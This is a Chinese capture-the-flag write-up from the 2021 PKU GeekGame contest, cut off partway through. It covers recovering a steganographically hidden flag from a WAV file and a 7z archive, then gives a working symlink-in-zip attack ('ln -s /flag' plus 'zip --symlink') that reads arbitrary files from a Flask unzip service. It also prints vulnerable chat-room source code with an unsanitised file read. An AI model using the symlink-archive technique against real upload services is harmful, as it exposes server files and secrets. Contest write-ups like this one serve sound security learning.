<pre class="line-numbers language-none"><code class="language-none">["setup", {}].`["stdout", "\u001b[01;32mroot@you-kali-vm\u001b[00m:\u001b[01;34m~/course/geekgame\u001b[00m# "].j["stdout", "\r\u001b[K\u001b[01;32mroot@you-kali-vm\u001b[00m:\u001b[01;34m~/course/geekgame\u001b[00m# "]..["stdout", "p"]..["stdout", "i"]..["stdout", "p"]..["stdout", "3"]..["stdout", " "]..["stdout", "i"]..["stdout", "n"]..["stdout", "s"]..["stdout", "t"]..["stdout", "a"]..["stdout", "l"]..["stdout", "l"]..["stdout", " "]..["stdout", "s"]..["stdout", "t"]..["stdout", "e"]..["stdout", "g"]..["stdout", "o"]..["stdout", "-"]..["stdout", "l"]..["stdout", "s"]..["stdout", "b"]..["stdout", "\r\n"].N["stdout", "Looking in indexes: https://pypi.tuna.tsinghua.edu.cn/simple\r\n"].&amp;["stdout", "Collecting stego-lsb\r\n"].~..["stdout", "  Downloading https://pypi.tuna.tsinghua.edu.cn/packages/8a/2b/5be4be36ccb3788f1443805583f9ab8182f88f15143778a72dc259b54557/stego_lsb-1.3.1.tar.gz (10 kB)\r\n"].&gt;["stdout", "  Preparing metadata (setup.py) ... \u001b[?25l-"]..["stdout", "\b \bdone\r\n"].~..["stdout", "\u001b[?25hRequirement already satisfied: Click&gt;=7.0 in /usr/local/lib/python3.8/dist-packages (from stego-lsb) (8.0.1)\r\n"].y["stdout", "Requirement already satisfied: Pillow&gt;=5.3.0 in /usr/lib/python3/dist-packages (from stego-lsb) (6.2.1)\r\n"].z["stdout", "Requirement already satisfied: numpy&gt;=1.15.4 in /usr/lib/python3/dist-packages (from stego-lsb) (1.17.4)\r\n"].C["stdout", "Building wheels for collected packages: stego-lsb\r\n"].H["stdout", "  Building wheel for stego-lsb (setup.py) ... \u001b[?25l-"]..["stdout", "\b \bdone\r\n"].~.*["stdout", "\u001b[?25h  Created wheel for stego-lsb: filename=stego_lsb-1.3.1-py2.py3-none-any.whl size=12135 sha256=20d5395e597058e6e37da40acc32a1c876fc7f334c671591c422b048e38cb5f2\r\n  Stored in directory: /root/.cache/pip/wheels/ee/b5/10/f779bd3e1c420586ef8cc2cb8768073362f51e3024e7116cc3\r\n"]..["stdout", "Successfully built stego-lsb\r\n"].:["stdout", "Installing collected packages: stego-lsb\r\n"].~.,["stdout", "Successfully installed stego-lsb-1.3.1\r\n\u001b[33mWARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv\u001b[0m\r\n"].`["stdout", "\u001b[01;32mroot@you-kali-vm\u001b[00m:\u001b[01;34m~/course/geekgame\u001b[00m# "]..["stdout", "s"]..["stdout", "t"]..["stdout", "e"]..["stdout", "g"]..["stdout", "o"]..["stdout", "-"]..["stdout", "l"]..["stdout", "\u0007"]..["stdout", "s"]..["stdout", "b"]..["stdout", " "]..["stdout", "\b\u001b[K"]..["stdout", "\b\u001b[K"]..["stdout", "\b\u001b[K"]..["stdout", "\b\u001b[K"]..["stdout", "\b\u001b[K"]..["stdout", "l"]..["stdout", "s"]..["stdout", "b"]..["stdout", " "]..["stdout", "w"]..["stdout", "a"]..["stdout", "v"]..["stdout", "s"]..["stdout", "t"]..["stdout", "e"]..["stdout", "g"]..["stdout", " "]..["stdout", "-"]..["stdout", "h"]..["stdout", " "]..["stdout", "-"]..["stdout", "i"]..["stdout", " "]..["stdout", "k"]..["stdout", "i"]..["stdout", "-"]..["stdout", "ringtrain.wav "]..["stdout", "-"]..["stdout", "s"]..["stdout", " "]..["stdout", "f"]..["stdout", "l"]..["stdout", "a"]..["stdout", "g"]..["stdout", "2"]..["stdout", "."]..["stdout", "t"]..["stdout", "xt "]..["stdout", "-"]..["stdout", "o"]..["stdout", " "]..["stdout", "f"]..["stdout", "l"]..["stdout", "\u0007ag"]..["stdout", "2"]..["stdout", "."]..["stdout", "txt "]..["stdout", "\b\u001b[K"]..["stdout", "\b\u001b[K"]..["stdout", "\b\u001b[K"]..["stdout", "\b\u001b[K"]..["stdout", "w"]..["stdout", "a"]..["stdout", "v"]..["stdout", " "]..["stdout", "-"]..["stdout", "n"]..["stdout", " "]..["stdout", "1"]..["stdout", "\r\n"].8["stdout", "Using 1 LSBs, we can hide 297712 bytes\r\n"].9["stdout", "Files read                     in 0.00s\r\n"].9["stdout", "76 bytes hidden                in 0.01s\r\n"].9["stdout", "Output wav written             in 0.00s\r\n"].`["stdout", "\u001b[01;32mroot@you-kali-vm\u001b[00m:\u001b[01;34m~/course/geekgame\u001b[00m# "]..["stdout", "7"]..["stdout", "z"]..["stdout", "a"]..["stdout", " "]..["stdout", "a"]..["stdout", " "]..["stdout", "f"]..["stdout", "l"]..["stdout", "a"]..["stdout", "g"]..["stdout", "2"]..["stdout", "."]....["stdout", "7"]..["stdout", "z"]..["stdout", " "]..["stdout", "f"]..["stdout", "l"]..["stdout", "a"]..["stdout", "g"]..["stdout", "2"]..["stdout", "."]..["stdout", "w"]..["stdout", "a"]..["stdout", "v"]..["stdout", " "]..["stdout", "-"]..["stdout", "p"]..["stdout", "\""]..["stdout", "\""]..["stdout", "\b"]..["stdout", "W\"\b"]..["stdout", "a\"\b"]..["stdout", "k\"\b"]..["stdout", "a\"\b"]..["stdout", "r\"\b"]..["stdout", "i\"\b"]..["stdout", "m\"\b"]..["stdout", "a\"\b"]..["stdout", "s\"\b"]..["stdout", "u\"\b"]..["stdout", "!\"\b"]..["stdout", " \"\b"]..["stdout", "`\"\b"]..["stdout", "d\"\b"]..["stdout", "a\"\b"]..["stdout", "t\"\b"]..["stdout", "e\"\b"]..["stdout", "`\"\b"]..["stdout", " \"\b"]..["stdout", "`\"\b"]..["stdout", "u\"\b"]..["stdout", "n\"\b"]..["stdout", "a\"\b"]..["stdout", "m\"\b"]..["stdout", "e\"\b"]..["stdout", " \"\b"]..["stdout", "-\"\b"]..["stdout", "n\"\b"]..["stdout", "o\"\b"]..["stdout", "m\"\b"]..["stdout", "`\"\b"]..["stdout", " \"\b"]..["stdout", "`\"\b"]..["stdout", "n\"\b"]..["stdout", "p\"\b"]..["stdout", "r\"\b"]..["stdout", "o\"\b"]..["stdout", "c\"\b"]..["stdout", "`\"\b"]..["stdout", "\r\n"].~..["stdout", "\r\n7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21\r\np7zip Version 16.02 (locale=en_US.utf8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz (806EC),ASM,AES-NI)\r\n\r\n"].~..["stdout", "Scanning the drive:\r\n  0M Scan \b\b\b\b\b\b\b\b\b\b          \b\b\b\b\b\b\b\b\b\b1 file, 4763436 bytes (4652 KiB)\r\n\r\nCreating archive: flag2.7z\r\n\r\nItems to compress: 1\r\n\r\n"]..["stdout", "  0%"].2["stdout", "\b\b\b\b    \b\b\b\b  3% + flag2.wav"].n["stdout", "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b                \b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b 29% + flag2.wav"].p["stdout", "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b                \b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b 57% 1 + flag2.wav"].z["stdout", "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b                  \b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b 82% 1 + flag2.wav"].~..["stdout", "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b                  \b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\r\nFiles read from disk: 1\r\nArchive size: 2935226 bytes (2867 KiB)\r\nEverything is Ok\r\n"].`["stdout", "\u001b[01;32mroot@you-kali-vm\u001b[00m:\u001b[01;34m~/course/geekgame\u001b[00m# "]....<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>还好不多，那就人工提取一下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip3 <span class="token function">install</span> stego-lsb
<span class="token comment"># stegolsb wavsteg balabala </span>
<span class="token comment"># 反正是把 flag2.txt 写入 wav 音频</span>
wavsteg -h -i ki-ringtrain.wav -s flag2.txt -o flag2.wav
7z a flag2.7z flag2.wav -p<span class="token string">"Wakarimasu! <span class="token variable"><span class="token variable">`</span><span class="token function">date</span><span class="token variable">`</span></span> <span class="token variable"><span class="token variable">`</span><span class="token function">uname</span> -nom<span class="token variable">`</span></span> <span class="token variable"><span class="token variable">`</span>nproc<span class="token variable">`</span></span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>uname -nom</code> 很明显是 <code>you-kali-vm x86_64 GNU/Linux</code> </p>
<p><code>nproc</code> 通过上面 7z 的执行过程 <code>8 CPUs</code> 可以知道是 <code>8</code>.</p>
<p> <code>date</code> 根据流量包的时间戳可以得到大概时间是 Nov  6, 2021 15:44:15.190826000 中国标准时间 这附近。</p>
<p>然而这个的格式不知道啊，试了几种常见的，老半天都不对啊……</p>
<p>再根据提示</p>
<blockquote>
<p><strong>第二阶段提示</strong> </p>
<p>Flag 1. You 酱在一边挂着 B 站直播间一边使用 Jupyter Notebook 出题，你只需关心后者 </p>
<p>Flag 2. You 酱前几天在服务器上运行了命令 <code>date</code>，并把输出分享给了你：<code>Sat 06 Nov 2021 11:45:14 PM CST</code></p>
</blockquote>
<p>最后得到密码是</p>
<pre class="line-numbers language-none"><code class="language-none">Wakarimasu! Sat 06 Nov 2021 03:44:15 PM CST you-kali-vm x86_64 GNU/Linux 8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>（为啥我不直接在 kali 里敲 <code>date</code> 试试啊，草</p>
<p>解压得到 <code>flag2.wav</code></p>
<p>根据上面的输入，可以知道用了 <a target="_blank" rel="noopener" href="https://pypi.org/project/stego-lsb/">stego-lsb 这个 pypi 库</a>。</p>
<p>参考文档将其恢复出来。</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211118204553345.png"></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ stegolsb wavsteg -r -i flag2.wav -o output.txt -n <span class="token number">1</span> -b <span class="token number">1000</span>      
Files <span class="token builtin class-name">read</span>                     <span class="token keyword">in</span> <span class="token number">0</span>.01s
Recovered <span class="token number">1000</span> bytes           <span class="token keyword">in</span> <span class="token number">0</span>.00s
Written output <span class="token function">file</span>            <span class="token keyword">in</span> <span class="token number">0</span>.00s
$ <span class="token function">cat</span> output.txt
788c3a128994e765373cfc171c00edfb3f603b67f68b087eb69cb8b8508135c5b90920d1b344<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后再还原一下得到 flag。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">flag2_en <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span><span class="token string">"788c3a128994e765373cfc171c00edfb3f603b67f68b087eb69cb8b8508135c5b90920d1b344"</span><span class="token punctuation">)</span>
flag2_de <span class="token operator">=</span> xor_each<span class="token punctuation">(</span>flag2_en<span class="token punctuation">,</span> key1<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag2_de<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><code>flag{ffdbca6ecc5d86cb71cadfd43df36649}</code></p>
<h2 id="在线解压网站"><a href="#在线解压网站" class="headerlink" title="在线解压网站"></a>在线解压网站</h2><blockquote>
<p>Q 小网盘可以在线预览多种文件，但是唯独压缩文件不能在线解压。这让小 A 十分难受。</p>
<p>为了解决这个问题，小 A 写了一个在线解压网站。只要你上传zip文件到这个网站，它就会自动帮你解压，之后你就可以访问解压出来的文件了。配合着浏览器插件，可以完美解决 Q 小网盘的痛点。</p>
<p>为了让大家相信他的网站是安全的，不会把压缩文件内容的泄漏给其他人，他在磁盘根目录下放了一个叫 flag 的文件，声称只要能拿到其中内容就可以获得一顿火锅。你以他的网站功能并不完整为理由，想骗取一顿火锅。然而他只是表示这并不影响网站的安全性，只有攻破网站的人才能获得火锅。</p>
<p>你十分生气，铁了心地要吃上这顿免费的火锅。</p>
<p><strong>你可以 <a target="_blank" rel="noopener" href="https://geekgame.pku.edu.cn/media/prob02_dbkw1hg2nj6qraif.zip?token=xxxxx">下载本题的程序</a></strong></p>
</blockquote>
<p>源码如下。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> json
<span class="token keyword">from</span> shutil <span class="token keyword">import</span> copyfile
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>url_for<span class="token punctuation">,</span>send_from_directory<span class="token punctuation">,</span>make_response<span class="token punctuation">,</span>redirect
<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>middleware<span class="token punctuation">.</span>proxy_fix <span class="token keyword">import</span> ProxyFix
<span class="token keyword">from</span> flask <span class="token keyword">import</span> jsonify
<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5
<span class="token keyword">import</span> signal
<span class="token keyword">from</span> http<span class="token punctuation">.</span>server <span class="token keyword">import</span> HTTPServer<span class="token punctuation">,</span> SimpleHTTPRequestHandler

os<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">'TEMP'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'/dev/shm'</span>

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span><span class="token string">"access"</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span>wsgi_app <span class="token operator">=</span> ProxyFix<span class="token punctuation">(</span>app<span class="token punctuation">.</span>wsgi_app<span class="token punctuation">,</span> x_for<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">,</span>x_proto<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        f<span class="token operator">=</span>request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>
        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"rm -rf /dev/shm/zip/media/*"</span><span class="token punctuation">)</span>
        path<span class="token operator">=</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"/dev/shm/zip/media"</span><span class="token punctuation">,</span><span class="token string">'tmp.zip'</span><span class="token punctuation">)</span>
        f<span class="token punctuation">.</span>save<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'timeout -k 1 3 unzip /dev/shm/zip/media/tmp.zip -d /dev/shm/zip/media/'</span><span class="token punctuation">)</span>
        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'rm /dev/shm/zip/media/tmp.zip'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/media/'</span><span class="token punctuation">)</span>
    response <span class="token operator">=</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> response

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/media/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/media'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/media/&lt;path&gt;'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">media</span><span class="token punctuation">(</span>path<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    npath<span class="token operator">=</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"/dev/shm/zip/media"</span><span class="token punctuation">,</span>path<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>npath<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> make_response<span class="token punctuation">(</span><span class="token string">"404"</span><span class="token punctuation">,</span><span class="token number">404</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>npath<span class="token punctuation">)</span><span class="token punctuation">:</span>
        f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span>npath<span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span>
        response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'application/octet-stream'</span>
        <span class="token keyword">return</span> response
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        fn<span class="token operator">=</span>os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>npath<span class="token punctuation">)</span>
        fn<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">".."</span><span class="token punctuation">]</span><span class="token operator">+</span>fn
        f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"templates/template.html"</span><span class="token punctuation">)</span>
        x<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        ret<span class="token operator">=</span><span class="token string">"&lt;h1&gt;文件列表:&lt;/h1&gt;&lt;br&gt;&lt;hr&gt;"</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> fn<span class="token punctuation">:</span>
            tpath<span class="token operator">=</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'/media/'</span><span class="token punctuation">,</span>path<span class="token punctuation">,</span>i<span class="token punctuation">)</span>
            ret<span class="token operator">+=</span><span class="token string">"&lt;a href='"</span><span class="token operator">+</span>tpath<span class="token operator">+</span><span class="token string">"'&gt;"</span><span class="token operator">+</span>i<span class="token operator">+</span><span class="token string">"&lt;/a&gt;&lt;br&gt;"</span>
        x<span class="token operator">=</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"HTMLTEXT"</span><span class="token punctuation">,</span>ret<span class="token punctuation">)</span>
        <span class="token keyword">return</span> x


os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'mkdir /dev/shm/zip'</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'mkdir /dev/shm/zip/media'</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>threaded<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到对上传的压缩包进行了解压处理，而在 <code>/media/&lt;path&gt;</code> 路由下读取了相应的文件，并返回给前端。</p>
<p>那就很简单啦，整个 symbolic link 符号链接到 <code>/flag</code>，然后 zip 压缩打包进去就完事了。</p>
<blockquote>
<p>zip / unzip 的参数（man page）</p>
<p>-y<br> ­–symlinks<br> For UNIX and VMS (V8.3 and later), store symbolic links as such in the  zip archive, instead of compressing and storing the file referred to by  the link. This can avoid multiple copies of files being included in the  archive as zip recurses the directory trees and accesses files directly  and by links.</p>
</blockquote>
<p>注意需要在 Linux 下进行操作（</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> -s /flag meowflag
<span class="token function">zip</span> --symlink meowflag.zip meowflag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>然后上传这个压缩包上去。</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211117015551674.png"></p>
<p>下载下来就是 <code>/flag</code></p>
<p><code>flag{neV3r_trUSt_Any_c0mpresSed_File}</code></p>
<h2 id="早期人类的聊天室"><a href="#早期人类的聊天室" class="headerlink" title="早期人类的聊天室"></a>早期人类的聊天室</h2><blockquote>
<p><span class="you-name">You</span> 酱有着二十一年网龄，她依稀记得最开始人们是怎么在网上聊天的。那时的网页聊天室功能单一，所有的信息都是纯文本，中文字符甚至需要手动编码，才能发送到网络的另一端。“你今天吃什么？” 亲切的问候顺着这条<b>虚拟</b>的信息<b>管道</b>传达到全世界，可能这就是 <ruby>管人<rt>VPiper</rt></ruby> 的魅力吧。</p>
<p>现在的年轻人似乎都不懂这种原始的沟通方式了，<span class="you-name">You</span> 酱很伤心。为了重铸 <ruby>管人<rt>VPiper</rt></ruby> 荣光，她用最喜欢的 Python 库 Flask 写了一个模拟早期聊天室的网页，希望你也能体会到其中的乐趣。</p>
<p><span class="you-name">You</span> 酱记得很清楚，系统上线之前应该关闭调试开关，设置正确的权限，并且用 uwsgi 代替 Flask 的自带服务器。Flag 文件位于磁盘的根目录，即 <code>/flag</code>。</p>
<p><b>点击 “打开/下载题目” 进入题目网页</b> </p>
<p><i>补充说明：初次访问时可能遇到 502 错误，这是因为后端尚未启动完成，等几秒后刷新即可</i></p>
</blockquote>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211118232937644.png"></p>
<p>实际上就是个 SSRF 的入口。</p>
<p>随便发点东西，返回的只是固定有限的几个结果，没啥用的亚子。</p>
<p>给了源码 <code>app.py</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> Response<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template
<span class="token keyword">import</span> utils<span class="token punctuation">,</span> base64

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    data<span class="token punctuation">[</span><span class="token string">'day'</span><span class="token punctuation">]</span> <span class="token operator">=</span> utils<span class="token punctuation">.</span>get_today<span class="token punctuation">(</span><span class="token punctuation">)</span>
    data<span class="token punctuation">[</span><span class="token string">'server_addr'</span><span class="token punctuation">]</span> <span class="token operator">=</span> utils<span class="token punctuation">.</span>get_default_server<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        data<span class="token punctuation">[</span><span class="token string">'server_addr'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'server'</span><span class="token punctuation">]</span>
        data<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> validate<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            data<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

        data<span class="token punctuation">[</span><span class="token string">'response'</span><span class="token punctuation">]</span> <span class="token operator">=</span> utils<span class="token punctuation">.</span>send_msg<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'server_addr'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        utils<span class="token punctuation">.</span>write_chat_log<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token string">'response'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'chatbot.html'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/module'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">module</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'name'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">:</span>
        page <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        page <span class="token operator">=</span> <span class="token string">'chatlog'</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token string">'chatlog'</span> <span class="token operator">==</span> page<span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            logfile <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'log'</span><span class="token punctuation">)</span> \
                <span class="token keyword">or</span> <span class="token string">'chat_log_%s'</span> <span class="token operator">%</span> utils<span class="token punctuation">.</span>get_today<span class="token punctuation">(</span><span class="token punctuation">)</span>
            log <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'media/{}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>logfile<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            log <span class="token operator">=</span> <span class="token string">'No chat log'</span>
        data<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token operator">=</span> log
    <span class="token keyword">elif</span> <span class="token string">'chatbot'</span> <span class="token operator">==</span> page<span class="token punctuation">:</span>
        data<span class="token punctuation">[</span><span class="token string">'day'</span><span class="token punctuation">]</span> <span class="token operator">=</span> utils<span class="token punctuation">.</span>get_today<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>

